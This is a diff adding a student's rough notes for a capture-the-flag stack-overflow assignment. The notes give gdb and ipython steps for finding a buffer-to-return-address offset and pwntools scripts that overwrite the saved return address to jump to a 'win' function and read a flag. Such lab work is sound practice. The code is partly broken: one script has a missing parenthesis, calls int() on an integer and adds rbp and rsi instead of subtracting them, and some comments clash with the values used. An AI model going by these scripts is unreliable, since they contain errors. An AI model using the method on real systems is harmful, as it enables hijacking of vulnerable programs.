@@ -1,0 +1,126 @@
+0: command: ./Assignment5_stackoverflow2
+1: Command: gdb Assignment5_stackoverflow2
+2: Command: (gdb) r (runs the program) tells you where an input signal is
+	    saved
+3: Command: (gdb) ctrl-c
+	output: Program received signal SIGINT, Interrupt.
+0x00007f7ab696a142 in __GI___libc_read (fd=0, buf=0x7ffe1c9ff690, nbytes=688)  (<- recieve signal here 0x7ffe1c9ff690)
+    at ../sysdeps/unix/sysv/linux/read.c:26
+26      ../sysdeps/unix/sysv/linux/read.c: No such file or directory.
+
+4: command: p $rsi
+	output: $1 = 140729378666128
+5: command: ipython
+6: python: hex(140729378666128)
+	output: Out[1]: '0x7ffe1c9ff690' <-this is the rsi register
+
+6: command: x/p $rsi
+	output: 0x7ffe1c9ff690: Undefined output format "p".	<--same register as a calculated ^
+
+7: command: x/i 0x7ffe1c9ff690 <- from step 3
+	output: 0x7ffe1c9ff690:      add    %dl,-0x39(%rdi)
+
+9: command: x/p $rbp
+	output: 0x7ffe1c9ff860: Undefined output format "p". <--- rbp register
+	
+10: command: (ipython) find rbp - rsi + 8 (this finds the distance)
+	command: 0x7ffe1c9ff860 - 0x7ffe1c9ff690 + 8
+	output: 472
+11: command: (ipython) hex(0x7ffe1c9ff690 + 472) <- rsi + distance from pointers
+	output: 0x7ffe1c9ff868
+
+12: command: x/b 0x7ffe1c9ff868
+	output: 0x89
+13: command: (gdb) x/20g 0x7ffe1c9ff690
+	output: (long output essentially need to find the line that ends with 89)
+		0x7ffe1c9ff860: 0x00007ffe1c9ff890      0x00005573508b8589 <--return adress
+		
+14: command: x/p win (to find win address)
+	output:0x5573508b8310 <win>:   Undefined output format "p". <--- save this register (this many bites away)
+
+15: command: x/i 0x00005573508b8589
+	output: 0x5573508b8589 <main+81>:    mov    $0x0,%eax <-save this register(it returns to here)
+
+16: command: (ipython) hex(0x5573508b8589 - 0x5573508b8310)
+	output: 0x279
+
+17: Python code for stackoverflow2: 
+#!/usr/bin/env python3
+import pwn
+import sys
+
+while True:
+	p = pwn.process('/Assignment5_stackoverflow2')
+	out = p.clean().decode()
+	
+	#returnAddress = out.split("Current Return Address: ")[1].split()[0] //ADDRESS CHANGES EVERYTIME
+	returnAddress = 0x00005573508b8589
+	print("Old: ", returnAddress)
+	
+	
+	#returnAddress = int(returnAddress, 16) #converts returnAddress from string to int
+	
+	
+	#0x279 = 0x5573508b8589 <main+81>(x/i -> that register to find->) - 0x5573508b8310 (x/p win)
+	
+	returnAddress = returnAddress - 0x279 <--- (how much it has to move)
+	print("New: ", returnAddress)
+	
+	#num = 0x7ffdcd783540 - 0x7ffdcd783050 + 8 = 1272 <- (calulated above)
+	num = 472
+	
+	payload = pwn.cyclic(num) + returnAddress.to_bytes(8, 'little')
+	
+	p.send(payload)
+	
+	print(p.clean().decode())
+	
+	sys.exit()
+//end stof2.py	
+
+another pythong program
+#!/usr/bin/env python3
+import pwn
+import sys
+programs that are setuid don't stay setuid if you debug them or move them for security reasons, and the challenge file is setuid so it can read the flag
+while True:
+	p = pwn.process('/Assignment5_stackoverflow2')
+	out = p.clean().decode()
+	
+	returnAddress = 0x00005573508b8589
+	returnAddress = int(returnAddress, 16)
+	#num = 472
+	#rbp - rsi + 8  
+	num = int('0x7ffedf74d9e0', 16) + int('0x7ffedf74d810', 16) + 8.
+	print(returnAddress)
+	print(hex(returnAddress)
+	
+	#payload = pwn.cyclic(num) + returnAddress.to_bytes(8, 'little')
+	payload = pwn.cyclic(num) + b"\10" + b"\x83"
+	p.send(payload)
+	
+	out = print(p.clean().decode())
+	if('pwn' in out):
+		print(out)
+		sys.exit()
+//end stack2.py	
+
+17: command: (ctf terminal) touch /tmp/out2.txt
+18: command: (ctf terminal from "cd /") python3 ./tmp/stof2.py > /tmp/out2.txt
+
+19: command: cat /tmp/out2.txt
+
+20: your flag should be there
+	
+	
+attempt2: 
+1: command: objdump -d ./Assignment5_stackoverflow2
+	output: really long output but we wanna find the <main> in the files specifically where its callq at the 			end thats the read function
+	1584:       e8 e0 fd ff ff          callq  1369 <vuln> <- note <vuln>
+	got to <vuln> sections and find 
+	1530:       e8 5b fc ff ff          callq  1190 <read@plt>
+2: command: nano /tmp/longstring.txt
+	write a really long string in this. Legit like 100 "a"'s or something
+3: command: gdb ./Assignment5_stackoverflow2
+4: command: b *0x1584 <- creates a breakpoint at the register
+5: command: r < /tmp/stack02.txt
